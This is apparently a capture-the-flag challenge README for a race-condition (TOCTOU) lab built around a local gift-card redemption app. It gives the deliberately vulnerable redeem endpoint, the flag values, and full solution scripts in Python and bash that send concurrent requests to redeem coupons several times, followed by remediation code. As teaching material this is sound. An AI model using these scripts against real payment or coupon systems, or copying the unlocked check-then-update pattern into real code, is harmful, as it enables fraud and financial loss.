# Oscar - Race Conditions Challenge

**Status:** ✅ Complete

## Player Description

Redeem your EverSec promotional codes here! Our Gift Card System™ is blazingly fast - we check if a code is valid, pause for a moment to admire our excellent code architecture, then add the balance. We're so confident in our system's speed that we don't use any of those complicated "database locks" or "transactions." That stuff just slows things down! Each coupon can only be redeemed once, and we enforce this by checking the redemption count. What could go wrong? It's not like multiple people would try to redeem the same code at the EXACT same instant. Time is continuous, after all! Our intern mentioned something about "race conditions" but we told him to stop watching NASCAR on company time.

*Note: Redemptions are validated by our fraud detection pipeline — processing may take a moment under high transaction volume.*

## Technical Description

**Category:** Web Security
**Difficulty:** Hard
**Points:** 1650 (450 + 550 + 650)
**Port:** 4011

EverSec's Gift Card System allows users to redeem promotional codes for account credit. Each code is supposed to be redeemable only once, but is that really enforced?

Can you exploit race conditions to redeem coupons multiple times?

**Note on Player Accounts**: Each browser session is automatically assigned a separate player account on first visit. To reset your balance and start fresh, clear your cookies or open a new incognito/private browsing window — this will create a brand new account.

## Learning Objectives

- Understanding Time-of-Check-Time-of-Use (TOCTOU) vulnerabilities
- Exploiting race conditions in web applications
- Learning about concurrent request handling
- Understanding proper synchronization and locking mechanisms
- Practical experience with parallelization and timing attacks

## Flags

- **FLAG 1** (450 points): Achieve $200+ balance by exploiting race condition
- **FLAG 2** (550 points): Achieve $500+ balance through advanced exploitation
- **FLAG 3** (650 points): Achieve $1000+ balance - become the race condition master

## Setup Instructions

### Using Docker Compose (Recommended)

```bash
# Start the challenge
docker compose up -d november-race-conditions

# View logs
docker compose logs -f november-race-conditions

# Stop the challenge
docker compose down november-race-conditions
```

### Using Docker

```bash
# Build the image
cd Challenges/november-race-conditions
docker build -t ctf-november-race-conditions .

# Run the container
docker run -d \
  -p 4011:4011 \
  --name ctf-november-race-conditions \
  -e FLAG1='r4c3_c0nd1t10n_pwn3d' \
  -e FLAG2='n3g4t1v3_b4l4nc3_h4ck' \
  -e FLAG3='r4c3_t0_th3_t0p' \
  ctf-november-race-conditions
```

### Local Development

```bash
cd Challenges/november-race-conditions
pip install -r requirements.txt
python app.py
```

Access at: http://localhost:4011

## Vulnerability Details

### The Race Condition

The coupon redemption endpoint has a classic TOCTOU vulnerability:

```python
@app.route('/redeem', methods=['POST'])
def redeem_coupon():
    # STEP 1: Check if coupon is valid
    coupon = conn.execute('SELECT * FROM coupons WHERE code = ?', (code,)).fetchone()

    # STEP 2: Check if coupon has redemptions remaining
    if coupon['current_redemptions'] >= coupon['max_redemptions']:
        return error('Coupon fully redeemed')

    # GAP: Multiple requests can pass these checks simultaneously!
    _run_fraud_check(user_id, code, coupon['value'])  # Simulated fraud detection API (~100ms)

    # STEP 3: Update balance
    conn.execute('UPDATE users SET balance = balance + ? WHERE id = ?',
                 (coupon['value'], user_id))

    # STEP 4: Increment redemption count
    conn.execute('UPDATE coupons SET current_redemptions = current_redemptions + 1
 WHERE id = ?',
                 (coupon['id'],))

    conn.commit()
```

**The Problem:**
- Multiple requests can all pass the validation checks before any of them updates the database
- No database transaction isolation
- No locking mechanism
- No request deduplication
- Intentional 100ms delay makes exploitation easier

### Available Coupons

- `WELCOME100`: $100 (1 redemption allowed)
- `BONUS50`: $50 (1 redemption allowed)
- `SPECIAL200`: $200 (1 redemption allowed)
- `PREMIUM500`: $500 (1 redemption allowed)
- `LOYALTY25`: $25 (5 redemptions allowed)

## Solution

### Method 1: Python Threading (Recommended)

Create a Python script to send concurrent requests:

```python
#!/usr/bin/env python3
import urllib.request
import urllib.parse
import json
import threading
import http.cookiejar

TARGET = "http://localhost:4011"

# Create cookie jar to maintain session
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
urllib.request.install_opener(opener)

def redeem_coupon(code, thread_num):
    """Redeem a coupon"""
    try:
        data = json.dumps({"code": code}).encode('utf-8')
        req = urllib.request.Request(
            f"{TARGET}/redeem",
            data=data,
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            result = json.loads(response.read().decode())
            print(f"[Thread {thread_num}] {result.get('message', result)}")
            return result
    except Exception as e:
        print(f"[Thread {thread_num}] Error: {e}")
        return None

def exploit_race_condition(coupon_code, num_requests=10):
    """Exploit race condition by sending concurrent requests"""
    print(f"\n[*] Exploiting {coupon_code} with {num_requests} concurrent requests...")

    # Create threads
    threads = []
    for i in range(num_requests):
        t = threading.Thread(target=redeem_coupon, args=(coupon_code, i))
        threads.append(t)

    # Start all threads at once
    for t in threads:
        t.start()

    # Wait for all to complete
    for t in threads:
        t.join()

def check_balance():
    """Check current balance and flags"""
    req = urllib.request.Request(f"{TARGET}/balance")
    with urllib.request.urlopen(req) as response:
        data = json.loads(response.read().decode())
        print(f"\n[+] Current Balance: ${data['balance']}")
        if data.get('flags'):
            print("\n🎉 FLAGS CAPTURED:")
            for flag_data in data['flags']:
                print(f"   {flag_data['flag']}")
                print(f"   {flag_data['message']}\n")
        return data['balance']

def main():
    print("="*60)
    print("Race Condition Exploit")
    print("="*60)

    # First, visit the page to establish session
    urllib.request.urlopen(f"{TARGET}/").read()

    # FLAG 1: Exploit WELCOME100 ($100 coupon)
    # Need $200+, so redeem it 3+ times
    exploit_race_condition("WELCOME100", num_requests=5)
    balance = check_balance()

    if balance < 500:
        # FLAG 2: Exploit SPECIAL200 ($200 coupon)
        exploit_race_condition("SPECIAL200", num_requests=5)
        check_balance()

    if balance < 1000:
        # FLAG 3: Exploit PREMIUM500 ($500 coupon)
        exploit_race_condition("PREMIUM500", num_requests=3)
        check_balance()

    print("="*60)
    print("Exploitation Complete!")
    print("="*60)

if __name__ == '__main__':
    main()
```

### Method 2: Bash with curl

```bash
#!/bin/bash
TARGET="http://localhost:4011"

# Establish session and get cookie
COOKIE=$(curl -s -c - "$TARGET/" | grep session | awk '{print $7}')

# Function to redeem coupon
redeem() {
    curl -s -X POST "$TARGET/redeem" \
        -H "Content-Type: application/json" \
        -H "Cookie: session=$COOKIE" \
        -d "{\"code\": \"$1\"}" &
}

# Exploit WELCOME100 with 10 concurrent requests
echo "[*] Exploiting WELCOME100..."
for i in {1..10}; do
    redeem "WELCOME100"
done
wait

# Check balance
curl -s "$TARGET/balance" -H "Cookie: session=$COOKIE" | python3 -m json.tool

# Exploit PREMIUM500
echo "[*] Exploiting PREMIUM500..."
for i in {1..5}; do
    redeem "PREMIUM500"
done
wait

curl -s "$TARGET/balance" -H "Cookie: session=$COOKIE" | python3 -m json.tool
```

### Method 3: Burp Suite Repeater

1. Capture a valid redemption request in Burp Proxy
2. Send to Repeater
3. Right-click → Send to Intruder
4. Set attack type to "Sniper" or "Pitchfork"
5. Set thread count to 10-20
6. Start attack - all requests sent concurrently
7. Check balance to see if race condition succeeded

### Method 4: Browser (Manual)

1. Open multiple browser tabs/windows (10+)
2. Load the challenge in each tab
3. In each tab, click the same coupon's "Redeem" button
4. Try to click all buttons as simultaneously as possible
5. Check if balance increased more than the coupon value

### Expected Results

- **1-2 concurrent requests**: Usually detected, one fails
- **3-5 concurrent requests**: High success rate for race condition
- **10+ concurrent requests**: Almost guaranteed to exploit the race

## Common Pitfalls

1. **Not maintaining session**: Each request needs the same session cookie
2. **Sequential requests**: Requests must be truly concurrent
3. **Too few requests**: Need enough simultaneous requests to hit the race window
4. **Network delays**: Local testing works better; remote testing needs more requests
5. **Giving up too soon**: May need to retry the exploit multiple times

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

The coupon logic checks whether redemption is still available, waits briefly (simulating fraud detection), then updates the counter. If multiple requests check at the same moment — before any update has occurred — what does each one observe?

</details>

<details>
<summary>Hint 2</summary>

Race condition exploitation requires requests to arrive simultaneously. How would you engineer that programmatically? Think about concurrency primitives that synchronize threads before releasing them all at once.

</details>

<details>
<summary>Hint 3</summary>

Multiple balance thresholds each have a flag. Once your race is working, what would it take to reach progressively higher targets?

</details>

## Prevention / Remediation

### 1. Database Transactions with Proper Isolation

```python
@app.route('/redeem', methods=['POST'])
def redeem_coupon_secure():
    conn = get_db()

    try:
        # Use transaction with SERIALIZABLE isolation
        conn.execute('BEGIN IMMEDIATE')

        # Lock the coupon row FOR UPDATE
        coupon = conn.execute('''
            SELECT * FROM coupons
            WHERE code = ? AND active = 1
        ''', (code,)).fetchone()

        if not coupon:
            conn.rollback()
            return error('Invalid coupon')

        if coupon['current_redemptions'] >= coupon['max_redemptions']:
            conn.rollback()
            return error('Coupon fully redeemed')

        # Update within the same transaction
        conn.execute('UPDATE users SET balance = balance + ? WHERE id = ?',
                     (coupon['value'], user_id))
        conn.execute('UPDATE coupons SET current_redemptions = current_redemptions + 1 WHERE id = ?',
                     (coupon['id'],))

        conn.commit()
        return success()

    except Exception as e:
        conn.rollback()
        raise
```

### 2. Application-Level Locking

```python
from threading import Lock

coupon_locks = {}
lock_registry_lock = Lock()

@app.route('/redeem', methods=['POST'])
def redeem_coupon_with_lock():
    code = request.json.get('code')

    # Get or create lock for this coupon
    with lock_registry_lock:
        if code not in coupon_locks:
            coupon_locks[code] = Lock()
        coupon_lock = coupon_locks[code]

    # Acquire lock for this specific coupon
    with coupon_lock:
        # Now only one request at a time can process this coupon
        return redeem_logic(code)
```

### 3. Idempotency Keys

```python
@app.route('/redeem', methods=['POST'])
def redeem_with_idempotency():
    idempotency_key = request.headers.get('X-Idempotency-Key')

    if not idempotency_key:
        return error('Idempotency key required')

    # Check if this request was already processed
    existing = conn.execute(
        'SELECT * FROM processed_requests WHERE idempotency_key = ?',
        (idempotency_key,)
    ).fetchone()

    if existing:
        # Return cached response
        return jsonify(existing['response'])

    # Process and cache result
    result = redeem_logic(code)
    conn.execute(
        'INSERT INTO processed_requests (idempotency_key, response) VALUES (?, ?)',
        (idempotency_key, json.dumps(result))
    )

    return result
```

### 4. Rate Limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: session.get('user_id'))

@app.route('/redeem', methods=['POST'])
@limiter.limit("1 per second")  # Only 1 redemption per second per user
def redeem_coupon():
    # ... redemption logic
```

## Best Practices

1. **Always use database transactions** for operations that must be atomic
2. **Use proper isolation levels** (SERIALIZABLE for critical operations)
3. **Implement SELECT FOR UPDATE** to lock rows being read
4. **Add application-level locking** for extra protection
5. **Use idempotency keys** for critical operations
6. **Implement rate limiting** to slow down potential attackers
7. **Add request deduplication** to prevent duplicate submissions
8. **Monitor for suspicious patterns** (many requests in short time)

## References

- [OWASP Race Conditions](https://owasp.org/www-community/vulnerabilities/Race_Conditions)
- [CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [Database Transaction Isolation Levels](https://en.wikipedia.org/wiki/Isolation_(database_systems))
- [Idempotency in APIs](https://stripe.com/docs/api/idempotent_requests)

## Author Notes

Race conditions are timing-dependent vulnerabilities that are often overlooked in security testing. They can lead to:

- Financial loss (duplicate transactions, negative balances)
- Inventory issues (overselling products)
- Resource exhaustion
- Privilege escalation
- Data corruption

This challenge demonstrates the importance of proper synchronization in concurrent systems. The 100ms delay is artificial, but in real applications, network latency, database queries, and complex business logic create natural race windows.

**Key Insight**: Never assume operations are atomic unless you explicitly make them atomic through transactions, locks, or other synchronization mechanisms.
